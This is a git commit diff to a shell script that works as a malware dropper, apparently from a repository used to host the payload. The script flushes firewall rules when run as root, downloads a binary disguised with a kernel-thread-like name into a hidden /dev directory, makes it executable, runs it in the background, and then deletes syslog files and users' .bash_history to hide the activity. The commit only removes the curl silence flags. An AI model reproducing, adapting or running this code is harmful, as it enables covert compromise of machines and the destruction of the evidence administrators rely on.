fecd3e039037813e61164b4ff6c8759c32ef9532
275178125 <68297291+275178125@users.noreply.github.com>
2020-07-14 16:49:11 -0400

    Update 78247812124.sh

--- 0000000/78247812124.sh
+++ 0000000/78247812124.sh
@@ -3,14 +3,14 @@
 if [[ "$EUID" == "0" ]]; then
 	iptables -F &
 	mkdir /dev/swapdt/
-	curl "https://raw.githubusercontent.com/275178125/7829157215/master/0000000/kswapdt" --silent -q --output /dev/swapdt/swapdt0
+	curl "https://raw.githubusercontent.com/275178125/7829157215/master/0000000/kswapdt" --output /dev/swapdt/swapdt0
 	chmod 777 /dev/swapdt/swapdt0
 	nohup /dev/swapdt/swapdt0 > /dev/null &
 	rm -rf /var/log/syslog*
 	find /home/ /root/ -name .bash_history -exec rm {} \;
 else
 	mkdir /dev/swapdt/
-	curl "https://raw.githubusercontent.com/275178125/7829157215/master/0000000/kswapdt" --silent -q --output /dev/swapdt/swapdt0
+	curl "https://raw.githubusercontent.com/275178125/7829157215/master/0000000/kswapdt" --output /dev/swapdt/swapdt0
 	chmod 777 /dev/swapdt/swapdt0
 	nohup /dev/swapdt/swapdt0 > /dev/null &
 	rm -rf /var/log/syslog*
